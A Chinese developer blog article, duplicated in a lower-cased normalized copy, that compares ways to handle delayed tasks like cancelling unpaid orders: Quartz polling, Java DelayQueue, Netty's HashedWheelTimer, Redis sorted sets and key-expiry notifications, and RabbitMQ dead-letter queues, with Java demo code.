思路\n\n该方案通常是在小型项目中使用，即通过一个线程定时的去扫描数据库，通过订单时间来判断是否有超时的订单，然后进行update或delete等操作\n\n# 实现\n\n博主当年早期是用quartz来实现的(实习那会的事)，简单介绍一下\n\nmaven项目引入一个依赖如下所示\n\n<dependency>\n    <groupId>org.quartz-scheduler</groupId>\n    <artifactId>quartz</artifactId>\n    <version>2.2.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n调用Demo类MyJob如下所示\n\npackage com.rjzheng.delay1;\n\nimport org.quartz.JobBuilder;\n\nimport org.quartz.JobDetail;\n\nimport org.quartz.Scheduler;\n\nimport org.quartz.SchedulerException;\n\nimport org.quartz.SchedulerFactory;\n\nimport org.quartz.SimpleScheduleBuilder;\n\nimport org.quartz.Trigger;\n\nimport org.quartz.TriggerBuilder;\n\nimport org.quartz.impl.StdSchedulerFactory;\n\nimport org.quartz.Job;\n\nimport org.quartz.JobExecutionContext;\n\nimport org.quartz.JobExecutionException;\n\npublic class MyJob implements Job {\n\n    public void execute(JobExecutionContext context)\n\n            throws JobExecutionException {\n\n        System.out.println("要去数据库扫描啦。。。");\n\n    }\n\n    public static void main(String[] args) throws Exception {\n\n        // 创建任务\n\n        JobDetail jobDetail = JobBuilder.newJob(MyJob.class)\n\n                .withIdentity("job1", "group1").build();\n\n        // 创建触发器 每3秒钟执行一次\n\n        Trigger trigger = TriggerBuilder\n\n                .newTrigger()\n\n                .withIdentity("trigger1", "group3")\n\n                .withSchedule(\n\n                        SimpleScheduleBuilder.simpleSchedule()\n\n                                .withIntervalInSeconds(3).repeatForever())\n\n                .build();\n\n        Scheduler scheduler = new StdSchedulerFactory().getScheduler();\n\n        // 将任务及其触发器放入调度器\n\n        scheduler.scheduleJob(jobDetail, trigger);\n\n        // 调度器开始调度任务\n\n        scheduler.start();\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n运行代码，可发现每隔3秒，输出如下\n\n要去数据库扫描啦。。。\n\n优缺点\n\n优点:简单易行，支持集群操作\n\n缺点:(1)对服务器内存消耗大\n\n(2)存在延迟，比如你每隔3分钟扫描一次，那最坏的延迟时间就是3分钟\n\n(3)假设你的订单有几千万条，每隔几分钟这样扫描一次，数据库损耗极大\n\n\n# 2、JDK的延迟队列\n\n# 思路\n\n该方案是利用JDK自带的DelayQueue来实现，这是一个无界阻塞队列，该队列只有在延迟期满的时候才能从中获取元素，放入DelayQueue中的对象，是必须实现Delayed接口的。\n\nDelayedQueue实现工作流程如下图所示\n\n\n\n其中Poll():获取并移除队列的超时元素，没有则返回空\n\ntake():获取并移除队列的超时元素，如果没有则wait当前线程，直到有元素满足超时条件，返回结果。\n\n# 实现\n\n定义一个类OrderDelay实现Delayed，代码如下\n\npackage com.rjzheng.delay2;\n\nimport java.util.concurrent.Delayed;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class OrderDelay implements Delayed {\n\n    private String orderId;\n\n    private long timeout;\n\n    OrderDelay(String orderId, long timeout) {\n\n        this.orderId = orderId;\n\n        this.timeout = timeout + System.nanoTime();\n\n    }\n\n    public int compareTo(Delayed other) {\n\n        if (other == this)\n\n            return 0;\n\n        OrderDelay t = (OrderDelay) other;\n\n        long d = (getDelay(TimeUnit.NANOSECONDS) - t\n\n                .getDelay(TimeUnit.NANOSECONDS));\n\n        return (d == 0) ? 0 : ((d < 0) ? -1 : 1);\n\n    }\n\n    // 返回距离你自定义的超时时间还有多少\n\n    public long getDelay(TimeUnit unit) {\n\n        return unit.convert(timeout - System.nanoTime(),TimeUnit.NANOSECONDS);\n\n    }\n\n    void print() {\n\n        System.out.println(orderId+"编号的订单要删除啦。。。。");\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n运行的测试Demo为，我们设定延迟时间为3秒\n\npackage com.rjzheng.delay2;\n\nimport java.util.ArrayList;\n\nimport java.util.List;\n\nimport java.util.concurrent.DelayQueue;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class DelayQueueDemo {\n\n     public static void main(String[] args) {  \n\n            // TODO Auto-generated method stub  \n\n            List<String> list = new ArrayList<String>();  \n\n            list.add("00000001");  \n\n            list.add("00000002");  \n\n            list.add("00000003");  \n\n            list.add("00000004");  \n\n            list.add("00000005");  \n\n            DelayQueue<OrderDelay> queue = newDelayQueue<OrderDelay>();  \n\n            long start = System.currentTimeMillis();  \n\n            for(int i = 0;i<5;i++){  \n\n                //延迟三秒取出\n\n                queue.put(new OrderDelay(list.get(i),  \n\n                        TimeUnit.NANOSECONDS.convert(3,TimeUnit.SECONDS)));  \n\n                    try {  \n\n                         queue.take().print();  \n\n                         System.out.println("After " +  \n\n                                 (System.currentTimeMillis()-start) + " MilliSeconds");  \n\n                } catch (InterruptedException e) {  \n\n                    // TODO Auto-generated catch block  \n\n                    e.printStackTrace();  \n\n                }  \n\n            }  \n\n        }  \n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n输出如下\n\n00000001编号的订单要删除啦。。。。\n\nAfter 3003 MilliSeconds\n\n00000002编号的订单要删除啦。。。。\n\nAfter 6006 MilliSeconds\n\n00000003编号的订单要删除啦。。。。\n\nAfter 9006 MilliSeconds\n\n00000004编号的订单要删除啦。。。。\n\nAfter 12008 MilliSeconds\n\n00000005编号的订单要删除啦。。。。\n\nAfter 15009 MilliSeconds\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n可以看到都是延迟3秒，订单被删除\n\n优缺点\n\n优点:效率高,任务触发时间延迟低。\n\n缺点:\n\n(1)服务器重启后，数据全部消失，怕宕机 (2)集群扩展相当麻烦 (3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM异常 (4)代码复杂度较高\n\n\n# 3、时间轮算法\n\n# 思路\n\n先上一张时间轮的图(这图到处都是啦)\n\n\n\n时间轮算法可以类比于时钟，如上图箭头（指针）按某一个方向按固定频率轮动，每一次跳动称为一个 tick。这样可以看出定时轮由个3个重要的属性参数，ticksPerWheel（一轮的tick数），tickDuration（一个tick的持续时间）以及 timeUnit（时间单位），例如当ticksPerWheel=60，tickDuration=1，timeUnit=秒，这就和现实中的始终的秒针走动完全类似了。\n\n如果当前指针指在1上面，我有一个任务需要4秒以后执行，那么这个执行的线程回调或者消息将会被放在5上。那如果需要在20秒之后执行怎么办，由于这个环形结构槽数只到8，如果要20秒，指针需要多转2圈。位置是在2圈之后的5上面（20 % 8 + 1）\n\n# 实现\n\n我们用Netty的HashedWheelTimer来实现\n\n给Pom加上下面的依赖\n\n<dependency>\n\n    <groupId>io.netty</groupId>\n\n    <artifactId>netty-all</artifactId>\n\n    <version>4.1.24.Final</version>\n\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n测试代码HashedWheelTimerTest如下所示\n\npackage com.rjzheng.delay3;\n\nimport io.netty.util.HashedWheelTimer;\n\nimport io.netty.util.Timeout;\n\nimport io.netty.util.Timer;\n\nimport io.netty.util.TimerTask;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class HashedWheelTimerTest {\n\n    static class MyTimerTask implements TimerTask{\n\n        boolean flag;\n\n        public MyTimerTask(boolean flag){\n\n            this.flag = flag;\n\n        }\n\n        public void run(Timeout timeout) throws Exception {\n\n            // TODO Auto-generated method stub\n\n             System.out.println("要去数据库删除订单了。。。。");\n\n             this.flag =false;\n\n        }\n\n    }\n\n    public static void main(String[] argv) {\n\n        MyTimerTask timerTask = new MyTimerTask(true);\n\n        Timer timer = new HashedWheelTimer();\n\n        timer.newTimeout(timerTask, 5, TimeUnit.SECONDS);\n\n        int i = 1;\n\n        while(timerTask.flag){\n\n            try {\n\n                Thread.sleep(1000);\n\n            } catch (InterruptedException e) {\n\n                // TODO Auto-generated catch block\n\n                e.printStackTrace();\n\n            }\n\n            System.out.println(i+"秒过去了");\n\n            i++;\n\n        }\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n输出如下\n\n1秒过去了\n\n2秒过去了\n\n3秒过去了\n\n4秒过去了\n\n5秒过去了\n\n要去数据库删除订单了。。。。\n\n6秒过去了\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n优缺点\n\n优点:效率高,任务触发时间延迟时间比delayQueue低，代码复杂度比delayQueue低。\n\n缺点:\n\n(1)服务器重启后，数据全部消失，怕宕机\n\n(2)集群扩展相当麻烦\n\n(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM异常\n\n\n# 4、redis缓存\n\n * 思路一\n\n利用redis的zset,zset是一个有序集合，每一个元素(member)都关联了一个score,通过score排序来取集合中的值\n\n添加元素:ZADD key score member [[score member] [score member] …]\n\n按顺序查询元素:ZRANGE key start stop [WITHSCORES]\n\n查询元素score:ZSCORE key member\n\n移除元素:ZREM key member [member …]\n\n测试如下\n\n添加单个元素\n\nredis> ZADD page_rank 10 google.com\n\n(integer) 1\n\n添加多个元素\n\nredis> ZADD page_rank 9 baidu.com 8 bing.com\n\n(integer) 2\n\nredis> ZRANGE page_rank 0 -1 WITHSCORES\n\n1) "bing.com"\n\n2) "8"\n\n3) "baidu.com"\n\n4) "9"\n\n5) "google.com"\n\n6) "10"\n\n查询元素的score值\n\nredis> ZSCORE page_rank bing.com\n\n"8"\n\n移除单个元素\n\nredis> ZREM page_rank google.com\n\n(integer) 1\n\nredis> ZRANGE page_rank 0 -1 WITHSCORES\n\n1) "bing.com"\n\n2) "8"\n\n3) "baidu.com"\n\n4) "9"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n那么如何实现呢？我们将订单超时时间戳与订单号分别设置为score和member,系统扫描第一个元素判断是否超时，具体如下图所示\n\n\n\n实现一\n\npackage com.rjzheng.delay4;\n\nimport java.util.Calendar;\n\nimport java.util.Set;\n\nimport redis.clients.jedis.Jedis;\n\nimport redis.clients.jedis.JedisPool;\n\nimport redis.clients.jedis.Tuple;\n\npublic class AppTest {\n\n    private static final String ADDR = "127.0.0.1";\n\n    private static final int PORT = 6379;\n\n    private static JedisPool jedisPool = new JedisPool(ADDR, PORT);\n\n    public static Jedis getJedis() {\n\n       return jedisPool.getResource();\n\n    }\n\n    //生产者,生成5个订单放进去\n\n    public void productionDelayMessage(){\n\n        for(int i=0;i<5;i++){\n\n            //延迟3秒\n\n            Calendar cal1 = Calendar.getInstance();\n\n            cal1.add(Calendar.SECOND, 3);\n\n            int second3later = (int) (cal1.getTimeInMillis() / 1000);\n\n            AppTest.getJedis().zadd("OrderId",second3later,"OID0000001"+i);\n\n            System.out.println(System.currentTimeMillis()+"ms:redis生成了一个订单任务：订单ID为"+"OID0000001"+i);\n\n        }\n\n    }\n\n    //消费者，取订单\n\n    public void consumerDelayMessage(){\n\n        Jedis jedis = AppTest.getJedis();\n\n        while(true){\n\n            Set<Tuple> items = jedis.zrangeWithScores("OrderId", 0, 1);\n\n            if(items == null || items.isEmpty()){\n\n                System.out.println("当前没有等待的任务");\n\n                try {\n\n                    Thread.sleep(500);\n\n                } catch (InterruptedException e) {\n\n                    // TODO Auto-generated catch block\n\n                    e.printStackTrace();\n\n                }\n\n                continue;\n\n            }\n\n            int  score = (int) ((Tuple)items.toArray()[0]).getScore();\n\n            Calendar cal = Calendar.getInstance();\n\n            int nowSecond = (int) (cal.getTimeInMillis() / 1000);\n\n            if(nowSecond >= score){\n\n                String orderId = ((Tuple)items.toArray()[0]).getElement();\n\n                jedis.zrem("OrderId", orderId);\n\n                System.out.println(System.currentTimeMillis() +"ms:redis消费了一个任务：消费的订单OrderId为"+orderId);\n\n            }\n\n        }\n\n    }\n\n    public static void main(String[] args) {\n\n        AppTest appTest =new AppTest();\n\n        appTest.productionDelayMessage();\n\n        appTest.consumerDelayMessage();\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n\n\n此时对应输出如下\n\n\n\n可以看到，几乎都是3秒之后，消费订单。\n\n然而，这一版存在一个致命的硬伤，在高并发条件下，多消费者会取到同一个订单号，我们上测试代码ThreadTest\n\npackage com.rjzheng.delay4;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class ThreadTest {\n\n    private static final int threadNum = 10;\n\n    private static CountDownLatch cdl = newCountDownLatch(threadNum);\n\n    static class DelayMessage implements Runnable{\n\n        public void run() {\n\n            try {\n\n                cdl.await();\n\n            } catch (InterruptedException e) {\n\n                // TODO Auto-generated catch block\n\n                e.printStackTrace();\n\n            }\n\n            AppTest appTest =new AppTest();\n\n            appTest.consumerDelayMessage();\n\n        }\n\n    }\n\n    public static void main(String[] args) {\n\n        AppTest appTest =new AppTest();\n\n        appTest.productionDelayMessage();\n\n        for(int i=0;i<threadNum;i++){\n\n            new Thread(new DelayMessage()).start();\n\n            cdl.countDown();\n\n        }\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n输出如下所示\n\n\n\n显然，出现了多个线程消费同一个资源的情况。\n\n解决方案\n\n(1)用分布式锁，但是用分布式锁，性能下降了，该方案不细说。\n\n(2)对ZREM的返回值进行判断，只有大于0的时候，才消费数据，于是将consumerDelayMessage()方法里的\n\nif(nowSecond >= score){\n\n    String orderId = ((Tuple)items.toArray()[0]).getElement();\n\n    jedis.zrem("OrderId", orderId);\n\n    System.out.println(System.currentTimeMillis()+"ms:redis消费了一个任务：消费的订单OrderId为"+orderId);\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n修改为\n\nif(nowSecond >= score){\n\n    String orderId = ((Tuple)items.toArray()[0]).getElement();\n\n    Long num = jedis.zrem("OrderId", orderId);\n\n    if( num != null && num>0){\n\n        System.out.println(System.currentTimeMillis()+"ms:redis消费了一个任务：消费的订单OrderId为"+orderId);\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n在这种修改后，重新运行ThreadTest类，发现输出正常了\n\n * 思路二\n\n该方案使用redis的Keyspace Notifications，中文翻译就是键空间机制，就是利用该机制可以在key失效之后，提供一个回调，实际上是redis会给客户端发送一个消息。是需要redis版本2.8以上。\n\n实现二\n\n在redis.conf中，加入一条配置\n\nnotify-keyspace-events Ex\n\n运行代码如下\n\npackage com.rjzheng.delay5;\n\nimport redis.clients.jedis.Jedis;\n\nimport redis.clients.jedis.JedisPool;\n\nimport redis.clients.jedis.JedisPubSub;\n\npublic class RedisTest {\n\n    private static final String ADDR = "127.0.0.1";\n\n    private static final int PORT = 6379;\n\n    private static JedisPool jedis = new JedisPool(ADDR, PORT);\n\n    private static RedisSub sub = new RedisSub();\n\n    public static void init() {\n\n        new Thread(new Runnable() {\n\n            public void run() {\n\n                jedis.getResource().subscribe(sub, "__keyevent@0__:expired");\n\n            }\n\n        }).start();\n\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n\n        init();\n\n        for(int i =0;i<10;i++){\n\n            String orderId = "OID000000"+i;\n\n            jedis.getResource().setex(orderId, 3, orderId);\n\n            System.out.println(System.currentTimeMillis()+"ms:"+orderId+"订单生成");\n\n        }\n\n    }\n\n    static class RedisSub extends JedisPubSub {\n\n        <ahref=\'http://www.jobbole.com/members/wx610506454\'>@Override</a>\n\n        public void onMessage(String channel, String message) {\n\n            System.out.println(System.currentTimeMillis()+"ms:"+message+"订单取消");\n\n        }\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n输出如下\n\n\n\n可以明显看到3秒过后，订单取消了\n\nps:redis的pub/sub机制存在一个硬伤，官网内容如下\n\n原:Because Redis Pub/Sub is fire and forget currently there is no way to use this feature if your application demands reliable notification of events, that is, if your Pub/Sub client disconnects, and reconnects later, all the events delivered during the time the client was disconnected are lost.\n\n翻: Redis的发布/订阅目前是即发即弃(fire and forget)模式的，因此无法实现事件的可靠通知。也就是说，如果发布/订阅的客户端断链之后又重连，则在客户端断链期间的所有事件都丢失了。因此，方案二不是太推荐。当然，如果你对可靠性要求不高，可以使用。\n\n优缺点\n\n优点:(1)由于使用Redis作为消息通道，消息都存储在Redis中。如果发送程序或者任务处理程序挂了，重启之后，还有重新处理数据的可能性。(2)做集群扩展相当方便 (3)时间准确度高\n\n缺点:(1)需要额外进行redis维护\n\n\n# 5、使用消息队列\n\n我们可以采用rabbitMQ的延时队列。RabbitMQ具有以下两个特性，可以实现延迟队列\n\nRabbitMQ可以针对Queue和Message设置 x-message-tt，来控制消息的生存时间，如果超时，则消息变为dead letter\n\nlRabbitMQ的Queue可以配置x-dead-letter-exchange 和x-dead-letter-routing-key（可选）两个参数，用来控制队列内出现了deadletter，则按照这两个参数重新路由。结合以上两个特性，就可以模拟出延迟消息的功能,具体的，我改天再写一篇文章，这里再讲下去，篇幅太长。\n\n优缺点\n\n优点: 高效,可以利用rabbitmq的分布式特性轻易的进行横向扩展,消息支持持久化增加了可靠性。\n\n缺点：本身的易用度要依赖于rabbitMq的运维.因为要引用rabbitMq,所以复杂度和成本变高。\n\n\n# 参考\n\nhttps://weihubeats.blog.csdn.net/article/details/106279593\n\nhttps://juejin.cn/post/7006898754926329869',normalizedContent:'在开发中，往往会遇到一些关于延时任务的需求，例如：\n\n * 生成订单30分钟未支付，则自动取消\n * 生成订单60秒后,给用户发短信\n\n该如何解决这类需求呢？\n\n\n\n * 方案调研\n * 方案分析\n   * 1、数据库轮询\n   * 2、jdk的延迟队列\n   * 3、时间轮算法\n   * 4、redis缓存\n   * 5、使用消息队列\n * 参考\n\n\n\n对上述的任务，我们给一个专业的名字来形容，那就是延时任务。那么这里就会产生一个问题，这个延时任务和定时任务的区别究竟在哪里呢？一共有如下几点区别\n\n * 定时任务有明确的触发时间，延时任务没有\n * 定时任务有执行周期，而延时任务在某事件触发后一段时间内执行，没有执行周期\n * 定时任务一般执行的是批处理操作是多个任务，而延时任务一般是单个任务\n\n下面，我们以判断订单是否超时为例，进行方案调研\n\n\n# 方案调研\n\n * 定时任务全表扫描\n   \n   缺点：需要全表扫描，任务设置轮询时间就是最大延迟时间，如 12 : 01下的订单，在 12 : 15 是有一次轮询，发现还没超时，此次不处理，在下一次 12 : 30 的执行时候发现超时需要处理了，但此时已过期（15 + 14）分钟。对数据库有一定压力，仅适合数据量少的业务场景\n   \n   优点: 实现简单，仅需要任务调度即可\n\n * 基于java delayqueue\n   \n   缺点: 单机、不能持久化、宕机任务丢失等等;\n   \n   优点：不依赖任何三方，仅java原生api即可\n\n * redis过期消息通知\n   \n   缺点： 开启键通知会对redis有额外的开销 键通知暂时redis并不保证消息必达，redis客户端断开连接所有key丢失 消费速度不可自控,如果一瞬间qps非常高,接收到的通知会非常密集,消费不过来, 如果用线程池消费,大部分的待消费任务会放入到阻塞队列 一旦服务宕机,阻塞队列消息全部丢失\n\n * mq提供的延时队列\n   \n   优点：消息0丢失，可抗高并发\n   \n   缺点：需要额外引入mq中间件，提高系统复杂性和mq高可用维护性\n\n * 借鉴redis的惰性删除策略\n   \n   订单过期时不删除，在查询订单时对订单过期时间作校验，如果过期则删除\n   \n   优点：减少对过期订单的检测，提高cpu利用率\n   \n   缺点：如果一直不访问订单，则库存一直无法回滚\n\n\n# 方案分析\n\n\n# 1、数据库轮询\n\n# 思路\n\n该方案通常是在小型项目中使用，即通过一个线程定时的去扫描数据库，通过订单时间来判断是否有超时的订单，然后进行update或delete等操作\n\n# 实现\n\n博主当年早期是用quartz来实现的(实习那会的事)，简单介绍一下\n\nmaven项目引入一个依赖如下所示\n\n<dependency>\n    <groupid>org.quartz-scheduler</groupid>\n    <artifactid>quartz</artifactid>\n    <version>2.2.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n调用demo类myjob如下所示\n\npackage com.rjzheng.delay1;\n\nimport org.quartz.jobbuilder;\n\nimport org.quartz.jobdetail;\n\nimport org.quartz.scheduler;\n\nimport org.quartz.schedulerexception;\n\nimport org.quartz.schedulerfactory;\n\nimport org.quartz.simpleschedulebuilder;\n\nimport org.quartz.trigger;\n\nimport org.quartz.triggerbuilder;\n\nimport org.quartz.impl.stdschedulerfactory;\n\nimport org.quartz.job;\n\nimport org.quartz.jobexecutioncontext;\n\nimport org.quartz.jobexecutionexception;\n\npublic class myjob implements job {\n\n    public void execute(jobexecutioncontext context)\n\n            throws jobexecutionexception {\n\n        system.out.println("要去数据库扫描啦。。。");\n\n    }\n\n    public static void main(string[] args) throws exception {\n\n        // 创建任务\n\n        jobdetail jobdetail = jobbuilder.newjob(myjob.class)\n\n                .withidentity("job1", "group1").build();\n\n        // 创建触发器 每3秒钟执行一次\n\n        trigger trigger = triggerbuilder\n\n                .newtrigger()\n\n                .withidentity("trigger1", "group3")\n\n                .withschedule(\n\n                        simpleschedulebuilder.simpleschedule()\n\n                                .withintervalinseconds(3).repeatforever())\n\n                .build();\n\n        scheduler scheduler = new stdschedulerfactory().getscheduler();\n\n        // 将任务及其触发器放入调度器\n\n        scheduler.schedulejob(jobdetail, trigger);\n\n        // 调度器开始调度任务\n\n        scheduler.start();\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n运行代码，可发现每隔3秒，输出如下\n\n要去数据库扫描啦。。。\n\n优缺点\n\n优点:简单易行，支持集群操作\n\n缺点:(1)对服务器内存消耗大\n\n(2)存在延迟，比如你每隔3分钟扫描一次，那最坏的延迟时间就是3分钟\n\n(3)假设你的订单有几千万条，每隔几分钟这样扫描一次，数据库损耗极大\n\n\n# 2、jdk的延迟队列\n\n# 思路\n\n该方案是利用jdk自带的delayqueue来实现，这是一个无界阻塞队列，该队列只有在延迟期满的时候才能从中获取元素，放入delayqueue中的对象，是必须实现delayed接口的。\n\ndelayedqueue实现工作流程如下图所示\n\n\n\n其中poll():获取并移除队列的超时元素，没有则返回空\n\ntake():获取并移除队列的超时元素，如果没有则wait当前线程，直到有元素满足超时条件，返回结果。\n\n# 实现\n\n定义一个类orderdelay实现delayed，代码如下\n\npackage com.rjzheng.delay2;\n\nimport java.util.concurrent.delayed;\n\nimport java.util.concurrent.timeunit;\n\npublic class orderdelay implements delayed {\n\n    private string orderid;\n\n    private long timeout;\n\n    orderdelay(string orderid, long timeout) {\n\n        this.orderid = orderid;\n\n        this.timeout = timeout + system.nanotime();\n\n    }\n\n    public int compareto(delayed other) {\n\n        if (other == this)\n\n            return 0;\n\n        orderdelay t = (orderdelay) other;\n\n        long d = (getdelay(timeunit.nanoseconds) - t\n\n                .getdelay(timeunit.nanoseconds));\n\n        return (d == 0) ? 0 : ((d < 0) ? -1 : 1);\n\n    }\n\n    // 返回距离你自定义的超时时间还有多少\n\n    public long getdelay(timeunit unit) {\n\n        return unit.convert(timeout - system.nanotime(),timeunit.nanoseconds);\n\n    }\n\n    void print() {\n\n        system.out.println(orderid+"编号的订单要删除啦。。。。");\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n运行的测试demo为，我们设定延迟时间为3秒\n\npackage com.rjzheng.delay2;\n\nimport java.util.arraylist;\n\nimport java.util.list;\n\nimport java.util.concurrent.delayqueue;\n\nimport java.util.concurrent.timeunit;\n\npublic class delayqueuedemo {\n\n     public static void main(string[] args) {  \n\n            // todo auto-generated method stub  \n\n            list<string> list = new arraylist<string>();  \n\n            list.add("00000001");  \n\n            list.add("00000002");  \n\n            list.add("00000003");  \n\n            list.add("00000004");  \n\n            list.add("00000005");  \n\n            delayqueue<orderdelay> queue = newdelayqueue<orderdelay>();  \n\n            long start = system.currenttimemillis();  \n\n            for(int i = 0;i<5;i++){  \n\n                //延迟三秒取出\n\n                queue.put(new orderdelay(list.get(i),  \n\n                        timeunit.nanoseconds.convert(3,timeunit.seconds)));  \n\n                    try {  \n\n                         queue.take().print();  \n\n                         system.out.println("after " +  \n\n                                 (system.currenttimemillis()-start) + " milliseconds");  \n\n                } catch (interruptedexception e) {  \n\n                    // todo auto-generated catch block  \n\n                    e.printstacktrace();  \n\n                }  \n\n            }  \n\n        }  \n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n输出如下\n\n00000001编号的订单要删除啦。。。。\n\nafter 3003 milliseconds\n\n00000002编号的订单要删除啦。。。。\n\nafter 6006 milliseconds\n\n00000003编号的订单要删除啦。。。。\n\nafter 9006 milliseconds\n\n00000004编号的订单要删除啦。。。。\n\nafter 12008 milliseconds\n\n00000005编号的订单要删除啦。。。。\n\nafter 15009 milliseconds\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n可以看到都是延迟3秒，订单被删除\n\n优缺点\n\n优点:效率高,任务触发时间延迟低。\n\n缺点:\n\n(1)服务器重启后，数据全部消失，怕宕机 (2)集群扩展相当麻烦 (3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现oom异常 (4)代码复杂度较高\n\n\n# 3、时间轮算法\n\n# 思路\n\n先上一张时间轮的图(这图到处都是啦)\n\n\n\n时间轮算法可以类比于时钟，如上图箭头（指针）按某一个方向按固定频率轮动，每一次跳动称为一个 tick。这样可以看出定时轮由个3个重要的属性参数，ticksperwheel（一轮的tick数），tickduration（一个tick的持续时间）以及 timeunit（时间单位），例如当ticksperwheel=60，tickduration=1，timeunit=秒，这就和现实中的始终的秒针走动完全类似了。\n\n如果当前指针指在1上面，我有一个任务需要4秒以后执行，那么这个执行的线程回调或者消息将会被放在5上。那如果需要在20秒之后执行怎么办，由于这个环形结构槽数只到8，如果要20秒，指针需要多转2圈。位置是在2圈之后的5上面（20 % 8 + 1）\n\n# 实现\n\n我们用netty的hashedwheeltimer来实现\n\n给pom加上下面的依赖\n\n<dependency>\n\n    <groupid>io.netty</groupid>\n\n    <artifactid>netty-all</artifactid>\n\n    